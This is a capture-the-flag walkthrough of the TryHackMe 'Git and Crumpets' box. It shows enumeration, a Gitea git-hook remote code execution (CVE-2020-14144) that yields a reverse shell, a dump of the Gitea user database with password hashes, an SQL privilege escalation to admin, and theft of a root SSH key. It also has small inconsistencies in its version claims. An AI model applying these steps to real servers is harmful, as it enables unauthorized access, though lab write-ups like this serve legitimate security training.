---
author: "Shebu"
title: "GitandCrumpets: THM"
date: "2022-02-18"
tags: ["fail2ban", "git", "gitea","githooks", "cve-2020-14144"]
cover:
    image: img/gitandcrumpets.png
    # can also paste direct link from external site
    # ex. https://i.ibb.co/K0HVPBd/paper-mod-profilemode.png
    alt: "<alt text>"
    caption: "<text>"
    relative: false # To use relative path for cover image, used in hugo Page-bundles
---

**Git and Crumpets** is a medium difficulty box from tryhackme which is mostly based on git. We get a shell on the box using a CVE in gitea's git hooks functionality .For root, we change the permissions of the **git** user to **root** user. Now we were able to see a private repository owned by root which had root user's ssh private key through which we login as root to get the root flag.

*[Image: header]*

|  **Room** 	| Git and Crumpets                                          	|
|:--------------:	|----------------------------------------------------	|
|     **OS**     	| Linux                                              	|
| **Difficulty** 	| Medium                                             	|
|  **Room Link** 	| [https://tryhackme.com/room/gitandcrumpets](https://tryhackme.com/room/gitandcrumpets)               	|
|   **Creator**  	| [hydragyrum](https://tryhackme.com/p/hydragyrum) 	|

# Enumeration 
----------------------

## Portscan 

```
┌──(root💀kali)-[~/gitsandcrumpets]
└─# nmap -sCV 10.10.234.147 -oN gitsandcrumpets.nmap
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-09 10:01 EST
Nmap scan report for 10.10.234.147
Host is up (0.35s latency).                                                                                                                                           
Not shown: 953 filtered tcp ports (no-response), 44 filtered tcp ports (admin-prohibited)                                                                             
PORT     STATE  SERVICE    VERSION                                                                                                                                    
22/tcp   open   ssh        OpenSSH 8.0 (protocol 2.0)                                                                                                                 
80/tcp   open   http nginx                                                                                                                                      
| http-title: Hello, World
|_Requested resource was http://10.10.234.147/index.html
9090/tcp closed zeus-admin

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.94 seconds
```

## Website: port 80

After the nmap scan I couldn't access the webpage .Initially I thought it might be some vpn issues. Later I got to know that **fail2ban** was used. So no more bruteforcing attempts!

>Fail2Ban is an **intrusion prevention software framework that protects computer servers from brute-force attacks**. Fail2ban scans log files (e.g. /var/log/apache/error_log) and bans IPs that show the malicious signs: too many password failures

The nmap results show that the machine ip is getting redirected to `http://10.10.234.147/index.html` .There was nothing quite interesting here.

*[Image: header]*

Searching for **/robots.txt** or any other directories leads to Rick Roll youtube video .

*[Image: header]*

We couldn't find any dirctories & there was pretty much nothing we could do here but using curl to retrieve the contents of the webpage reveals the following.

```
┌──(root💀kali)-[~/thm/gitsandcrumpets]
└─# curl 10.10.174.224
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Go away!</title>
  </head>
  <body>
    <main>
      <h1>Nothing to see here, move along</h1>
      <h2>Notice:</h2>
      <p> 
        Hey guys,
           I set up the dev repos at git.git-and-crumpets.thm, but I haven't gotten around to setting up the DNS yet. 
           In the meantime, here's a fun video I found!
        Hydra
      </p>
      <pre>
iiiii*nMMWWWWW@@@@@WWWWW@@@@@@@@@WnnxxnnnnnnnnnxxxMMW@@@@@@@@@@@@@@@WWWW@WW@WMMz*iiiiiiiiiiiiii;iiiiiiiiiiii
;;;;;;;;;;;;;iiiiiii;;;;;;;;;;i;;;;;;;;;;iiiiii+xMMWWWWW@@@@@WWWWWW@@@@@@@@WxnMMMMMMxMMMMMWWWWWW@@@@@@@@@@@@@@@WWWWWW@WMx#*iiiiiiiiiiiiiiiiiiiiiiiiiii
;;;;;;;;;;;;iiiiiii;;;;;;;;;;;;;;;;ii;;;;iiiiii#xxMMWWWW@@@@@WWWWWW@@@@@@@WWnxxxnnxxxxxxxxxxxMWW@@@@@@@@@@@@@@@@WWWWW@WMx+iiiiiiiiiiiiiiiiiiiii;iiiiii
;ii;;;i;;;;iiiiiiii;;;;;;;;;;;;;;;;;;;;iiiiiiii#xMWMMMMMWWWWWMMWWWW@@@@@@@@WxxMxxxMMMMxxxMMWWWWWW@@@@@@@@@@@@@@@@WWWW@WMz*iiiiiiiiiiiiiiiiiiiiiiiiiiii
;ii;;;ii;iiiiiiiiii;;;;;;;;;;;;;;;;;;;;iiiiiiii#xMMMMMxxxMMx##zxWWW@@@@@@@WWxxxxxxxxxxxMMMMMMMMWW@@@@@@@@@@@@@@@@@WWWWMx+*iiiiiiiiiiiiiiiiiiiiiiiiiiii
iiiiiiiiiiiiiiiiiii;;;;;;;;;;i;;;;;iii;iiiiiiii#xMMMMxxxMMn++#zxWWW@@@@@@@WWxxxxxnnnnxxxnxMMWWWWW@@@@@@@@@@@@@@@@@@WWWx#**iiiiiiiiiiiiiiiiiiiiiiiiiiii
iiiiiiiiiiiiiiiiiiii;;;;;;;;;ii;;;;iiiiiiiiiiii+xMMMMMMnz#++#zzxWWW@@@@@@@@WxnxxxxxxxMMxxxxMxMMWW@@@@@@@@@@@@@@@@@@WMx+**iiiiiiiiiiiiiiiiiiii;ii;iiiii
iiiiiiiiiiiiiiiiiiiiiiiii;;;iiii;;iiiiiiiiiiiiii#nMMxM#***+#zzzxWWW@@@@@@@WWxnMMMMMMMMMMMMMMWWWWWW@@@@@@@@WWW@@@@WWMz+***iiiiiiiiiiiiiiiiiiiiiiiiiiiii
iiiiiiiiiiiiiiiiiii;;;;ii;;;;ii;;;iiiiiiiiiiiiiii#xxxn++##zzzzzxWW@@@@@@@@WWxnxxxxMMMxxxxxMMMMMMMWW@@@@@@@@WW@@@WWMn+***iiiiiiiiiiiiiiiiiiiiiiiiiiiiii
iiiiiiiiiiiiiiiiiii;;;;ii;;;;i;;;;;;iiiiiiiiiiiii+xxxzzzzzzznnnxW@@@@@@@@@@WxnxxnnnnnnnnnnxMMMMWWWWWWW@@@@@@@@@WWMMx#***iiiiiiiiiiiiiiiiiiiiiiiiiiiiii
iiiiiiiiiiiiiiiiiii;;;;i;;;;;i;;;;;;;;iiiiiiiiiiizxMMnzzzzzznnnMW@@@@@@@@@@WxxxxxxxMMMWWWMMWWWWMWWWWWWW@@@@@@@WWMMMMx+***iiiiiiiiiiiiiiiiiiiiiiiiiiiii
iiiiiiiiiiiiiiiiiii;;;;i;;;;i;;;;;;;;;iiiiiiiiiiizxMMnzzzzzzznnxW@@@@@@@@@@WxxxnxxMMWWMMWMMxMWMxMW@@WWWW@@@@@@WWMMMMMn+***iiiiiiiiiiiiiiiiiiiiiiiiiiii

Never gonna give you up,
            Never gonna let you down...
      </pre>
    </main>
  </body>
</html>
```
## Gitea

In the comments we see a hostname called `git.git-and-crumpets.thm` . Added it to /etc/hosts file & visited the page.

*[Image: header]*

It' a `Gitea` page.

>Gitea is an open-source forge software package for hosting software development version control using Git as well as other collaborative features like bug tracking, wikis and code review. 

Viewing the source code reveals the version of gitea as `1.14.0`

*[Image: header]*

# Shell as git
-------------------

Create an account in **signup** page and log in to the account.

*[Image: header]*

Here we have 3 repositories `cant-touch-this`, `hello world`.

*[Image: header]*

There are 4 users `hydra`, `root groot`, `scones`& `test` other than the account which I created. 

*[Image: header]*

Visit the `cant-touch-this` repository which the user `scones` owns .

*[Image: header]*

There are 5 commits in this repo.
Here there is a comment in one of the commits mentioning that the user scones has stored his password in his avatar.

*[Image: header]*

Using **exiftool** to retrieve user **scones** password .

```
┌──(root💀kali)-[~/thm/gitsandcrumpets]
└─# exiftool 3fc2cde6ac97e8c8a0c8b202e527d56d.png                                                                                                          

ExifTool Version Number         : 12.36
File Name                       : 3fc2cde6ac97e8c8a0c8b202e527d56d.png
Directory                       : ..
File Size                       : 279 KiB
File Modification Date/Time     : 2022:02:10 10:09:37-05:00
File Access Date/Time           : 2022:02:10 10:09:37-05:00
File Inode Change Date/Time     : 2022:02:10 10:09:37-05:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 290
Image Height                    : 290
Bit Depth                       : 16
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Description                     : My 'Password' should be easy enough to guess
Image Size                      : 290x290
Megapixels                      : 0.084
```
Now after logging in to the website as scones ,we see that the user has access to modify git hooks .

>Git hooks are **scripts that run automatically every time a particular event occurs in a Git repository**.

## CVE-2020-14144

There is a CVE exploit for **git hooks** feature in Gitea 1.1.0 to 1.12.5  through which we could get a reverse shell .
This works for
Blog post for this Githooks RCE: https://podalirius.net/en/articles/exploiting-cve-2020-14144-gitea-authenticated-remote-code-execution/

Edit the contents of git-hook with a reverse shell one-liner & click on **Update hook.**

*[Image: header]*

Make changes in README.md file & commit the changes to trigger a callback.

*[Image: header]*

We get a connection back on our machine & we are user `git` on the machine!
```bash
┌──(root💀kali)-[~/thm/gitsandcrumpets/cant-touch-this]
└─# nc -lvnp 9001/9001 0>&1

listening on [any] 9001 ...
connect to [10.17.6.87] from (UNKNOWN) [10.10.59.255] 37618
bash: cannot set terminal process group (869): Inappropriate ioctl for device
bash: no job control in this shell
[git@git-and-crumpets cant-touch-this.git]$ whoami
git
```
I uploaded my ssh-public keys and ssh'ed into the machine & grabbed the user flag 🚩.
```bash
┌──(root💀kali)-[~]
└─# ssh git@10.10.59.255 -i id_rsa 

Last failed login: Thu Feb 10 16:59:14 CET 2022 from 10.17.6.87 on ssh:notty
There were 2 failed login attempts since the last successful login.
Last login: Sat Apr 17 23:07:52 2021
[git@git-and-crumpets ~]$ ls -al
total 20
drwx------. 3 git  git  129 Apr 15  2021 .
drwxr-xr-x. 4 root root  35 Apr 14  2021 ..
lrwxrwxrwx. 1 git  git    9 Apr 15  2021 .bash_history -> /dev/null
-rw-r--r--. 1 git  git   18 Jul 21  2020 .bash_logout
-rw-r--r--. 1 git  git  141 Jul 21  2020 .bash_profile
-rw-r--r--. 1 git  git  376 Jul 21  2020 .bashrc
-rw-r--r--. 1 git  git  162 Apr 14  2021 .gitconfig
drwx------. 2 git  git   29 Apr 14  2021 .ssh
-r--------. 1 git  git   53 Apr 15  2021 user.txt

[git@git-and-crumpets ~]$ cat user.txt
dGhte2ZkN2Fi*********jZDcwY2YzZDZhYTE2fQ==

[git@git-and-crumpets ~]$ cat user.txt | base64 -d
thm{fd7ab9f*********d6aa16}
```
# Shell as root
-----------------------

By default gitea logs all its data into `/var/lib/gitea`.
```sql
[git@git-and-crumpets data]$ pwd
/var/lib/gitea/data

## sqlite3 db

[git@git-and-crumpets data]$ ls -al
total 1288
drwxr-x---. 11 git git     170 Feb 10 16:51 .
drwxr-xr-x.  5 git git      57 Apr 15  2021 ..
drwxr-xr-x.  2 git git       6 Apr 14  2021 attachments
drwxr-xr-x.  3 git git     217 Feb 10 16:45 avatars
-rw-r--r--.  1 git git 1318912 Feb 10 16:45 gitea.db
drwxr-xr-x.  5 git git      45 Apr 15  2021 gitea-repositories
drwxr-xr-x.  4 git git      46 Apr 14  2021 indexers
drwxr-xr-x.  2 git git       6 Apr 14  2021 lfs
drwxr-xr-x.  7 git git     114 Apr 14  2021 queues
drwxr-xr-x.  2 git git       6 Apr 14  2021 repo-avatars
drwx------. 15 git git     123 Feb 10 16:35 sessions
drwxr-xr-x.  3 git git      24 Feb 10 16:51 tmp
```
We have an `gitea.db` file here. Examine the db file.

```sql
sqlite> .tables
access                     org_user                 
access_token               project                  
action                     project_board            
attachment                 project_issue            
collaboration              protected_branch         
comment                    public_key               
commit_status              pull_request             
deleted_branch             reaction                 
deploy_key                 release                  
email_address              repo_indexer_status      
email_hash                 repo_redirect            
external_login_user        repo_topic               
follow                     repo_transfer            
gpg_key                    repo_unit                
gpg_key_import             repository               
hook_task                  review                   
issue                      session                  
issue_assignees            star                     
issue_dependency           stopwatch                
issue_label                task                     
issue_user                 team                     
issue_watch                team_repo                
label                      team_unit                
language_stat              team_user                
lfs_lock                   topic                    
lfs_meta_object            tracked_time             
login_source               two_factor               
milestone                  u2f_registration         
mirror                     upload                   
notice                     user                     
notification               user_open_id             
oauth2_application         user_redirect            
oauth2_authorization_code  version                  
oauth2_grant               watch                    
oauth2_session             webhook   

sqlite> SELECT * FROM user;
1|hydra|hydra||hydragyrum@example.com|0|enabled|9b020d3e158bc31b5fe64d668d94cab38cadc6721a5fdf7a4b1fb7bf97021c5e68f56bd9bd44d5ce9547e5e234086342c4e4|pbkdf2|0|0|0||0|||XGySX7uBlc|3C4NzJWN9e|en-US||1618386984|1621615239|1621614217|0|-1|1|1|0|0|0|0|0|d91f03c868d38ecf84ab3cc54f876106|hydragyrum@example.com|1|0|0|0|1|0|0|0|0|unified|arc-green|0

2|root|root|groot|root@example.com|0|enabled|2181d2b5fbf1859db426bcb94d97851d9a0e87a5eb47c5edc7f92bffc45b679e554c8367084f379e59936b68c0d770823ec9|pbkdf2|0|0|0||0|||2VK8fSxvIZ|5e5xPrzvBr|en-US||1618391049|1621716065|1621716065|1|-1|1|0|1|0|0|0|0|b2b218891f86ea980812a5b934ecec1a|root@examle.com|1|0|0|0|1|0|0|0|0|unified|gitea|0

3|scones|scones||withcream@example.com|0|enabled|8d0386b217e0f1ad5a1012d879ce93c9d77fd79d888410fdee9e76ec58d6fa017042906dd9a2ea498d3fd5a7486a73875660|pbkdf2|0|0|0||0|Her Majesty's Secret Service||IF60pw0rVc|13y4Vtc2AH|en-US|I like scones.|1618492621|1644507952|1644507952|0|-1|1|0|0|1|0|0|0|3fc2cde6ac97e8c8a0c8b202e527d56d|jackel@example.com|1|0|0|0|1|0|0|0|0|unified|gitea|0

4|test|test||test@test.thm|0|enabled|d3463d9c205751364af7850bca7956d0f5cc0eb125a097db54fd0087eec31cec1912245e57fdfc53423a89e6684a15f8939a|pbkdf2|0|0|0||0|||oe4oKzc3mk|EgtShiimON|en-US||1618526457|1618526530|1618526457|0|-1|1|0|0|0|0|0|0|15c9bc2cfbc7b7fd0b627422d8189173|test@test.thm|0|0|0|0|0|0|0|0|0|unified|gitea|0

5|shebu|shebu||shebu@gits.thm|0|enabled|e4d2b4f6680ab31ec40dfa49e4aac7fec580db3e67d9ec9ff31267db26f70e98fc9ad86db9cf05b5f313274bf30c30de7163|pbkdf2|0|0|0||0|||fdbwIzFByW|IIserdA0R2|en-US||1644507919|1644507920|1644507919|0|-1|1|0|0|0|0|0|0|6790b3c717baa3412054f123049a7205|shebu@gits.thm|0|0|0|0|0|0|0|0|0||gitea|0

```

Update our permissions to root user.

```sql
sqlite> UPDATE user SET is_admin=1 WHERE id=3;
```

Now if we visit the website we see a private repository  called `backups` owned by root!

*[Image: header]*

We have 2 branches in here `master` & `dotfiles`.

*[Image: header]*

The **dotfiles** branch has 4 commits. We see that the root user added his ssh keys and then deleted it.

*[Image: header]*

Lets now grab the SSH private key and ssh into the box as root to grab the root flag!🚩

NOTE: The name of the file is the passphrase required to ssh in as root.

```
┌──(root💀kali)-[~/thm/gitsandcrumpets]
└─# ssh root@git.git-and-crumpets.thm -i id_rsa 
Enter passphrase for key 'id_rsa': 
Last login: Sat Jul  3 21:36:13 2021 from 192.168.247.1

[root@git-and-crumpets ~]# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

[root@git-and-crumpets ~]# cat /root/root.txt
dGhtezYzMjAy*********g4NzI0MGRjNmExfQ==

[root@git-and-crumpets ~]# cat /root/root.txt | base64 -d
thm{6320228d*********7240dc6a1}
```
